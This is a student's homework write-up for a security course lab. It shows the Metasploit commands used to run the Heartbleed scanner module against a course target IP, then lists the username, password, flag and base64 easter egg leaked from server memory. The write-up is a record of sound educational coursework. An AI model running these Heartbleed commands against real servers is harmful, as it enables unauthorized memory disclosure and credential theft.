<b>I pledge on my honor that I have not given or received any unauthorized assistance on this homework or assignment. -Jacob Elspas</b>

Homework #4

Part 1: I started off by opening a Bash Terminal and making a metasploit container using the following command 
``` nc 159.89.233.47 1337``` and then running ```mfsconsole```.
The I ran ```search heartbleed``` to find the path for the heartbleed attack, and then selected it with ``` use auxiliary/scanner/ssl/openssl_heartbleed```.
Next, I set the parameters for the exploit and subsequently ran it with the following commands:
``` 
set RHOSTS 165.227.204.80
set VERBOSE true
exploit
```
This ran the exploit on the IP address 165.227.204.80, which is the IP address of the website www.briong.com. I found this by using a website where you give it a domain name and it returns it’s IP address: 

![](/img/briong-IP.PNG)

After the execution of heartbleed, I looked through the output that was returned and I found the flag, as well as a username and a password:

* username=mnthomp22
* password=pass1234
* flag=CMSC389R-{h3art_bl33d}

Lastly, I also found an easter egg in the same line : easteregg=V0FJVCBUSElTIElTTidUIEVOQ1JZUFRJT04/Pw0KQ01TQzM4OVIte2Jhc2U2NF9pc19zdGlsbF91c2VkX2Zvcl9jcnlwdDB9!

![](/img/bash-flag.PNG)
